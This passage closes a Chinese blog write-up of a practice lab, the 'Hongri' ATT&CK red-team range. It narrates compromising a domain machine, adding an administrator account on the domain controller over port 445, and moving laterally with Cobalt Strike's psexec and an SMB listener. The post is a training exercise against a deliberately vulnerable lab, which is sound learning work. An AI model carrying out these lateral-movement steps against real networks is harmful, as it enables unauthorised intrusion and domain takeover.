+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/32.png" class>
+
+<p>能够成功执行命令，拿下域里的一台机器，ctrl+] 再输入q退出telnet</p>
+<p>还有一台域控，利用同样的方法扫描端口，存在445端口，同样的方法去打，添加用户</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/33.png" class>
+
+<p>成功添加用户到管理员组，接下来使用 Cobalt Strike，执行net view查看共享的资源</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/34.png" class>
+
+<p>成功发现域控主机，利用我们添加的用户横向登录到域控，选择横向移动，psexec，添加SMB的监听器</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/35.png" class>
+
+<p>登录成功，开启一个会话交互，执行systeminfo命令</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/36.png" class>
+
+<p>成功拿下域控机器，到此靶场渗透结束</p>
+<h2 id="0x04-结语与反思"><a href="#0x04-结语与反思" class="headerlink" title="0x04 结语与反思"></a>0x04 结语与反思</h2><p>第一次打内网靶场，路程还是挺艰辛的。外网打点还是比较轻松的，打到内网 Windows 主机就不知道怎么搞了，跟着别的师傅的教程也算是打完了，后续会对Windows主机的命令操作以及 Cobalt Strike 和MSF渗透工具的深入使用。以下是我参考的文章链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324441.html">ATT&amp;CK红队评估（红日靶场一）</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">https://xilitter.github.io/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/" title="Spring内存马浅析"><img class="cover" src="/img/art03.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Spring内存马浅析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">0x01 靶场环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.1.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83IP%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">环境IP配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">0x02 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">外网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyadmin%E5%86%99shell"><span class="toc-number">2.2.</span> <span class="toc-text">phpMyadmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">0x03 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobalt-Strike%E8%BF%9C%E6%8E%A7"><span class="toc-number">3.1.</span> <span class="toc-text">Cobalt Strike远控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.2.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E4%BC%9A%E8%AF%9D%E5%88%B0msf"><span class="toc-number">3.2.1.</span> <span class="toc-text">返回会话到msf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bsocket%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.2.</span> <span class="toc-text">建立socket代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.3.</span> <span class="toc-text">横向渗透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%93%E8%AF%AD%E4%B8%8E%E5%8F%8D%E6%80%9D"><span class="toc-number">4.</span> <span class="toc-text">0x04 结语与反思</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="ATT&amp;CK红队评估(红日靶场一)"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK红队评估(红日靶场一)"/></a><div class="content"><a class="title" href="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="ATT&amp;CK红队评估(红日靶场一)">ATT&amp;CK红队评估(红日靶场一)</a><time datetime="2023-10-05T08:19:10.000Z" title="发表于 2023-10-05 16:19:10">2023-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/" title="Spring内存马浅析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring内存马浅析"/></a><div class="content"><a class="title" href="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/" title="Spring内存马浅析">Spring内存马浅析</a><time datetime="2023-09-13T09:16:08.000Z" title="发表于 2023-09-13 17:16:08">2023-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="结合反序列化注入tomcat内存马"><img src="/img/art/a3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="结合反序列化注入tomcat内存马"/></a><div class="content"><a class="title" href="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="结合反序列化注入tomcat内存马">结合反序列化注入tomcat内存马</a><time datetime="2023-09-04T11:22:46.000Z" title="发表于 2023-09-04 19:22:46">2023-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="初识Java Agent内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初识Java Agent内存马"/></a><div class="content"><a class="title" href="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="初识Java Agent内存马">初识Java Agent内存马</a><time datetime="2023-08-30T06:49:53.000Z" title="发表于 2023-08-30 14:49:53">2023-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Valve内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Valve内存马"/></a><div class="content"><a class="title" href="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Valve内存马">java内存马连续剧——Valve内存马</a><time datetime="2023-08-27T07:13:07.000Z" title="发表于 2023-08-27 15:13:07">2023-08-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a7.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
